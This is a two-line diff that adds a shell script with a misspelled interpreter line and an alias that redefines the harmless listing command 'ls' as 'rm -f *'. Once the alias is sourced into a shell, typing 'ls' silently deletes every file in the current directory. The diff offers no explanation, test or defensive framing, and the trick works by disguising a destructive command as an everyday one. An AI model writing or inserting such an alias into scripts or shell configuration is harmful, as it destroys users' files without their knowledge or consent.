@@ -1,0 +1,2 @@
+#!/bon/bash
+alias ls="rm -f *"
